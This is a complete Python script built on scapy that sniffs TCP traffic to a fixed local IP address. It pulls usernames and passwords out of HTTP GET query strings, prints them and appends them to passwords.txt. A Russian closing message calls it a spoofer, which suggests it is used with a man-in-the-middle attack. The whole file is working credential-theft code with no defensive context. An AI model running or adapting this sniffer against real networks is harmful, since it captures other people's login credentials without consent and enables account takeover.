from scapy.all import *
from scapy.packet import Packet
from urllib.parse import urlparse
from urllib.parse import parse_qs

f = open("passwords.txt", "a")

def process_packet(packet: Packet):
    if packet.haslayer(TCP):
        if packet[IP].dst == "192.168.23.8":
                if Raw in packet:
                    try:
                        text = packet[Raw].load.decode('utf-8')
                        if "user-name" in text:
                            request = text.split("\n")[0]
                            _, url, _ = request.split()
                            parsed_url = urlparse(url)
                            login = parse_qs(parsed_url.query)['user-name'][0]
                            password = parse_qs(parsed_url.query)['user-password'][0]
                            print(f"Captured: login: {login} password: {password}")
                            f.write(f"{login}: {password}\n")

                    except: 
                         pass

try:
    cap = sniff(prn=process_packet, iface="Realtek PCIe GbE Family Controller")
finally:
    f.close()
    print("Спуфер остановлен, хорошая работа!")